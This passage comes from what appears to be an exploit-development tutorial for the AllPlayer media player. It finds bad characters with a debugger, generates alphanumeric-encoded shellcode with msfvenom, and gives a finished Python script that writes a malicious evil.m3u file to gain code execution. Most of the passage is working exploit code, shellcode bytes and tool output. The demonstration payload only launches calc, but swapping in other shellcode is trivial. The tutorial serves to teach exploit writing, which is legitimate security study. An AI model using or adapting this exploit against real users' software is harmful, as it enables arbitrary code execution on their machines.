       "\x6e"           # venetian shellcode 
       "\xc3"           # retn
       )

nops = "\x90" * 45 

badchars = (
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

payload = "http://" + "A" * 301 + "\x61\x6e" + "\x7a\x74" + align + nops + badchars + "D" * ( 707 - len(align) - len(nops) - len(badchars) )

f=open("bad.m3u","wb")
f.write(payload)
f.close()
```

<p style="text-align:justify;">
Now lets run the script above in order to generate the <b>bad.m3u</b> file. If we run the vulnerable application with Immunity Debugger we wil see that there are some bad chars 
</p>

<p style="text-align:justify;">
According with what we see at the memory dump in Immunity Debugger, we can realize that the byte <b>"\x0a"</b> is a bad character. We will now remove it from PoC script and we will examine the stack again. 
</p>


<img src="{{ site.baseurl }}/assets/images/2019/AllPLayer/bad.png" style="display:block;margin-left:auto;margin-right:auto;border:1px solid #1A1B1C;" width="530" height="390">

<p style="text-align:justify;">
After running the script again, we can see that the bytes <b>"\x0d"</b> and <b>"\x80"</b> are bad characters. At this point we will update the PoC script removing the characters "\x00\x0a\x0d\x80". If we run the script and examine the memory dump again, we will see that the problem with the bad characters stil exists in the range of characters from <b>0x82</b> until <b>0xA0</b>. 
</p>


<img src="{{ site.baseurl }}/assets/images/2019/AllPLayer/0x82 - 0xA0.png" style="display:block;margin-left:auto;margin-right:auto;border:1px solid #1A1B1C;" width="530" height="390">

<p style="text-align:justify;">
Later on, we have identified that the bad characters are the following
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
"\x00\x0a\x0d\x80\x82\x83\x8a\x84\x85\x86\x87\x88\x89\x8b\x8c\x8d\x8e\x8f\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
</pre>

<p style="text-align:justify;">
If we remove all these bad characters above and then update our PoC script, we will not have any bad characters
</p>


<img src="{{ site.baseurl }}/assets/images/2019/AllPLayer/clear.png" style="display:block;margin-left:auto;margin-right:auto;border:1px solid #1A1B1C;" width="530" height="390">


<p style="text-align:justify;">
As we have said before, because we will encode our shellcode with the <b>Alpha2 Alphanumeric Uppercase Encoder</b>  encoder, we are interested only in finding bad characters in the range from <b>0x41 (A)</b> until <b>0x5A (Z)</b>. All the bad characters we found are not relevant, so we are good to go and construct our shellcode. 
</p>

------------

### Finalizing the Exploit

<p style="text-align:justify;">
At this point we will create our shellcode which will be the "evil" calculator. In order to do this we will use <b>msfvenom</b> as follows 
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
root@kali:/home/kali# msfvenom -p windows/exec CMD=calc -e x86/unicode_upper BufferRegister=EAX -f python
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/unicode_mixed
x86/unicode_mixed succeeded with size 504 (iteration=0)
x86/unicode_mixed chosen with final size 504
Payload size: 504 bytes
Final size of python file: 2456 bytes
buf =  b""
buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"
buf += b"\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51\x41\x44\x41"
buf += b"\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51"
buf += b"\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41\x5a\x31"
buf += b"\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41"
buf += b"\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49\x41"
buf += b"\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41"
buf += b"\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41"
buf += b"\x47\x42\x39\x75\x34\x4a\x42\x69\x6c\x48\x68\x33\x52"
buf += b"\x4d\x30\x4d\x30\x4b\x50\x51\x50\x63\x59\x39\x55\x4c"
buf += b"\x71\x77\x50\x63\x34\x74\x4b\x52\x30\x6c\x70\x44\x4b"
buf += b"\x61\x42\x6a\x6c\x74\x4b\x71\x42\x6e\x34\x34\x4b\x53"
buf += b"\x42\x4f\x38\x4c\x4f\x48\x37\x30\x4a\x6b\x76\x6c\x71"
buf += b"\x39\x6f\x64\x6c\x6f\x4c\x30\x61\x61\x6c\x4a\x62\x4c"
buf += b"\x6c\x6f\x30\x67\x51\x58\x4f\x7a\x6d\x7a\x61\x35\x77"
buf += b"\x69\x52\x49\x62\x4f\x62\x50\x57\x62\x6b\x6e\x72\x6e"
buf += b"\x30\x32\x6b\x6d\x7a\x4d\x6c\x42\x6b\x30\x4c\x4c\x51"
buf += b"\x61\x68\x37\x73\x4e\x68\x49\x71\x38\x51\x50\x51\x62"
buf += b"\x6b\x32\x39\x6d\x50\x7a\x61\x77\x63\x62\x6b\x4d\x79"
buf += b"\x4b\x68\x6a\x43\x6d\x6a\x6f\x59\x54\x4b\x6c\x74\x62"
buf += b"\x6b\x59\x71\x77\x66\x6c\x71\x6b\x4f\x44\x6c\x56\x61"
buf += b"\x68\x4f\x4c\x4d\x4a\x61\x76\x67\x4e\x58\x67\x70\x32"
buf += b"\x55\x4c\x36\x4a\x63\x73\x4d\x6b\x48\x6f\x4b\x51\x6d"
buf += b"\x6b\x74\x54\x35\x68\x64\x51\x48\x64\x4b\x72\x38\x6e"
buf += b"\x44\x6d\x31\x68\x53\x43\x36\x74\x4b\x5a\x6c\x6e\x6b"
buf += b"\x74\x4b\x50\x58\x6b\x6c\x4a\x61\x77\x63\x54\x4b\x69"
buf += b"\x74\x74\x4b\x4b\x51\x5a\x30\x54\x49\x71\x34\x4d\x54"
buf += b"\x4c\x64\x51\x4b\x4f\x6b\x71\x51\x4f\x69\x4f\x6a\x32"
buf += b"\x31\x59\x6f\x67\x70\x31\x4f\x6f\x6f\x31\x4a\x52\x6b"
buf += b"\x6a\x72\x48\x6b\x44\x4d\x71\x4d\x32\x4a\x69\x71\x34"
buf += b"\x4d\x35\x35\x78\x32\x79\x70\x4b\x50\x4b\x50\x4e\x70"
buf += b"\x52\x48\x6c\x71\x32\x6b\x52\x4f\x52\x67\x69\x6f\x48"
buf += b"\x55\x77\x4b\x7a\x50\x44\x75\x55\x52\x62\x36\x52\x48"
buf += b"\x76\x46\x43\x65\x57\x4d\x73\x6d\x39\x6f\x58\x55\x6f"
buf += b"\x4c\x6c\x46\x31\x6c\x4c\x4a\x55\x30\x59\x6b\x47\x70"
buf += b"\x73\x45\x6a\x65\x65\x6b\x31\x37\x6c\x53\x33\x42\x42"
buf += b"\x4f\x71\x5a\x4b\x50\x52\x33\x39\x6f\x46\x75\x31\x53"
buf += b"\x31\x51\x70\x6c\x6f\x73\x79\x70\x41\x41"
</pre>

<p style="text-align:justify;">
We will finalize our python PoC script as follows 
</p>


```python

align=("\x56"           # push esi
       "\x6e"           # venetian shellcode
       "\x58"           # pop eax
       "\x6e"           # venetian shellcode
       "\x05\x19\x11"   # add eax,0x11001900
       "\x6e"           # venetian shellcode 
       "\x2d\x16\x11"   # sub eax,0x11001600
       "\x6e"           # venetian shellcode 
       "\x50"           # push eax
       "\x6e"           # venetian shellcode 
       "\xc3"           # retn
       )

nops = "\x90" * 45

buf =  b""
buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"
buf += b"\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51\x41\x44\x41"
buf += b"\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51"
buf += b"\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41\x5a\x31"
buf += b"\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41"
buf += b"\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49\x41"
buf += b"\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41"
buf += b"\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41"
buf += b"\x47\x42\x39\x75\x34\x4a\x42\x69\x6c\x48\x68\x33\x52"
buf += b"\x4d\x30\x4d\x30\x4b\x50\x51\x50\x63\x59\x39\x55\x4c"
buf += b"\x71\x77\x50\x63\x34\x74\x4b\x52\x30\x6c\x70\x44\x4b"
buf += b"\x61\x42\x6a\x6c\x74\x4b\x71\x42\x6e\x34\x34\x4b\x53"
buf += b"\x42\x4f\x38\x4c\x4f\x48\x37\x30\x4a\x6b\x76\x6c\x71"
buf += b"\x39\x6f\x64\x6c\x6f\x4c\x30\x61\x61\x6c\x4a\x62\x4c"
buf += b"\x6c\x6f\x30\x67\x51\x58\x4f\x7a\x6d\x7a\x61\x35\x77"
buf += b"\x69\x52\x49\x62\x4f\x62\x50\x57\x62\x6b\x6e\x72\x6e"
buf += b"\x30\x32\x6b\x6d\x7a\x4d\x6c\x42\x6b\x30\x4c\x4c\x51"
buf += b"\x61\x68\x37\x73\x4e\x68\x49\x71\x38\x51\x50\x51\x62"
buf += b"\x6b\x32\x39\x6d\x50\x7a\x61\x77\x63\x62\x6b\x4d\x79"
buf += b"\x4b\x68\x6a\x43\x6d\x6a\x6f\x59\x54\x4b\x6c\x74\x62"
buf += b"\x6b\x59\x71\x77\x66\x6c\x71\x6b\x4f\x44\x6c\x56\x61"
buf += b"\x68\x4f\x4c\x4d\x4a\x61\x76\x67\x4e\x58\x67\x70\x32"
buf += b"\x55\x4c\x36\x4a\x63\x73\x4d\x6b\x48\x6f\x4b\x51\x6d"
buf += b"\x6b\x74\x54\x35\x68\x64\x51\x48\x64\x4b\x72\x38\x6e"
buf += b"\x44\x6d\x31\x68\x53\x43\x36\x74\x4b\x5a\x6c\x6e\x6b"
buf += b"\x74\x4b\x50\x58\x6b\x6c\x4a\x61\x77\x63\x54\x4b\x69"
buf += b"\x74\x74\x4b\x4b\x51\x5a\x30\x54\x49\x71\x34\x4d\x54"
buf += b"\x4c\x64\x51\x4b\x4f\x6b\x71\x51\x4f\x69\x4f\x6a\x32"
buf += b"\x31\x59\x6f\x67\x70\x31\x4f\x6f\x6f\x31\x4a\x52\x6b"
buf += b"\x6a\x72\x48\x6b\x44\x4d\x71\x4d\x32\x4a\x69\x71\x34"
buf += b"\x4d\x35\x35\x78\x32\x79\x70\x4b\x50\x4b\x50\x4e\x70"
buf += b"\x52\x48\x6c\x71\x32\x6b\x52\x4f\x52\x67\x69\x6f\x48"
buf += b"\x55\x77\x4b\x7a\x50\x44\x75\x55\x52\x62\x36\x52\x48"
buf += b"\x76\x46\x43\x65\x57\x4d\x73\x6d\x39\x6f\x58\x55\x6f"
buf += b"\x4c\x6c\x46\x31\x6c\x4c\x4a\x55\x30\x59\x6b\x47\x70"
buf += b"\x73\x45\x6a\x65\x65\x6b\x31\x37\x6c\x53\x33\x42\x42"
buf += b"\x4f\x71\x5a\x4b\x50\x52\x33\x39\x6f\x46\x75\x31\x53"
buf += b"\x31\x51\x70\x6c\x6f\x73\x79\x70\x41\x41"

payload = "http://" + "A" * 301 + "\x61\x6e" + "\x7a\x74" + align + nops + buf + "D" * ( 707 - len(align) - len(nops) - len(buf) )

f=open("evil.m3u","wb")
f.write(payload)
f.close()

```

<p style="text-align:justify;">
if we now execute the python script above, the <b>evil.m3u</b> file will be generated and when we load this file into our vulnerable <b>AllPlayer</b> application, then we will have our calculator executed 
</p>

<img src="{{ site.baseurl }}/assets/images/2019/AllPLayer/calc.png" style="display:block;margin-left:auto;margin-right:auto;border:1px solid #1A1B1C;" width="400" height="350">
